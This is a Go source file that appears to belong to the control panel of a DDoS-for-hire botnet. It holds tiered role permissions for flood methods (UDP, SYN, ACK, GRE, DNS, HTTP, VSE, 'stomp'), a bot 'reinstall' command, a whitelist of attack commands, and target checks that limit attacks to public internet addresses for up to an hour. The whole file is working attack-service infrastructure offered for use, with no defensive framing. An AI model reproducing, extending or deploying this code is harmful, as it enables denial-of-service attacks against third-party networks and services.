package main

import (
	"encoding/json"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

type permSet struct {
	Methods map[string][]string `json:"method_permissions"`
}

var (
	rbac   *permSet
	rbacMu sync.RWMutex
)

func loadPerms() error {
	raw, err := os.ReadFile(rbacFile)
	if err != nil {
		def := permSet{Methods: map[string][]string{
			"!udpsmart":  {"Owner", "Admin", "Pro", "Basic"},
			"!udpflood":  {"Owner", "Admin", "Pro", "Basic"},
			"!tcpflood":  {"Owner", "Admin", "Pro"},
			"!synflood":  {"Owner", "Admin", "Pro"},
			"!ackflood":  {"Owner", "Admin"},
			"!greflood":  {"Owner", "Admin"},
			"!dns":       {"Owner", "Admin"},
			"!http":      {"Owner", "Admin", "Pro", "Basic"},
			"!reinstall": {"Owner"},
		}}
		out, _ := json.MarshalIndent(def, "", "  ")
		os.WriteFile(rbacFile, out, 0600)
		rbacMu.Lock()
		rbac = &def
		rbacMu.Unlock()
		return nil
	}
	var cfg permSet
	if err := json.Unmarshal(raw, &cfg); err != nil {
		return err
	}
	rbacMu.Lock()
	rbac = &cfg
	rbacMu.Unlock()
	return nil
}

func validMethod(m string) bool {
	rbacMu.RLock()
	defer rbacMu.RUnlock()
	_, ok := rbac.Methods[m]
	return ok
}

func getPerms() map[string][]string {
	rbacMu.RLock()
	defer rbacMu.RUnlock()
	cp := make(map[string][]string)
	for k, v := range rbac.Methods {
		cp[k] = v
	}
	return cp
}

func setPerms(method string, levels []string) error {
	rbacMu.Lock()
	rbac.Methods[method] = levels
	rbacMu.Unlock()
	out, err := json.MarshalIndent(rbac, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(rbacFile, out, 0600)
}

func roles() []string { return []string{"Owner", "Admin", "Pro", "Basic"} }

func validCmd(method string) bool {
	m := strings.ToLower(strings.TrimSpace(method))
	ok := map[string]bool{
		"udp": true, "!udp": true, "udpsmart": true, "!udpsmart": true,
		"tcp": true, "!tcp": true, "syn": true, "!syn": true,
		"ack": true, "!ack": true, "gre": true, "!gre": true,
		"vse": true, "!vse": true, "xmas": true, "!xmas": true,
		"pps": true, "ppsbypass": true, "!pps": true,
		"stomp": true, "tcpstomp": true, "!stomp": true,
		"reinstall": true, "!rst": true, "!amp": true, "!reinstall": true,
		"stop": true, "STOP": true,
	}
	return ok[m]
}

func (a *acct) canUse(method string) bool {
	if a.Level == "Owner" {
		return true
	}
	rbacMu.RLock()
	defer rbacMu.RUnlock()
	allowed, ok := rbac.Methods[method]
	if !ok {
		return false
	}
	for _, r := range allowed {
		if a.Level == r {
			return true
		}
	}
	return false
}

func checkIP(s string) bool {
	ip := net.ParseIP(s)
	if ip == nil {
		return false
	}
	if ip.IsLoopback() || ip.IsMulticast() || ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() || ip.IsUnspecified() {
		return false
	}
	if ip4 := ip.To4(); ip4 != nil {
		blocked := []*net.IPNet{
			{IP: net.IPv4(10, 0, 0, 0), Mask: net.CIDRMask(8, 32)},
			{IP: net.IPv4(172, 16, 0, 0), Mask: net.CIDRMask(12, 32)},
			{IP: net.IPv4(192, 168, 0, 0), Mask: net.CIDRMask(16, 32)},
			{IP: net.IPv4(169, 254, 0, 0), Mask: net.CIDRMask(16, 32)},
			{IP: net.IPv4(100, 64, 0, 0), Mask: net.CIDRMask(10, 32)},
			{IP: net.IPv4(127, 0, 0, 0), Mask: net.CIDRMask(8, 32)},
			{IP: net.IPv4(0, 0, 0, 0), Mask: net.CIDRMask(8, 32)},
			{IP: net.IPv4(192, 0, 2, 0), Mask: net.CIDRMask(24, 32)},
			{IP: net.IPv4(198, 51, 100, 0), Mask: net.CIDRMask(24, 32)},
			{IP: net.IPv4(203, 0, 113, 0), Mask: net.CIDRMask(24, 32)},
		}
		for _, n := range blocked {
			if n.Contains(ip4) {
				return false
			}
		}
	} else {
		ip6 := ip.To16()
		if ip6[0] == 0xfc || ip6[0] == 0xfd {
			return false
		}
		if len(ip6) >= 4 && ip6[0] == 0x20 && ip6[1] == 0x01 && ip6[2] == 0x0d && ip6[3] == 0xb8 {
			return false
		}
	}
	return ip.IsGlobalUnicast()
}

func checkPort(s string) bool {
	p, err := strconv.Atoi(s)
	return err == nil && p > 0 && p <= 65535
}

func checkDur(s string) (time.Duration, bool) {
	d, err := strconv.Atoi(s)
	if err != nil || d < 1 || d > 3600 {
		return 0, false
	}
	return time.Duration(d) * time.Second, true
}

func checkUser(u string) bool {
	ok, _ := regexp.MatchString(`^[a-zA-Z0-9_-]{3,20}$`, u)
	return ok
}

func checkPass(p string) bool {
	if len(p) < 8 {
		return false
	}
	return regexp.MustCompile(`[A-Z]`).MatchString(p) &&
		regexp.MustCompile(`[a-z]`).MatchString(p) &&
		regexp.MustCompile(`[0-9]`).MatchString(p)
}

func checkFilename(f string) bool {
	ok, _ := regexp.MatchString(`^[a-zA-Z0-9_-]+\.tfx$`, f)
	return ok
}
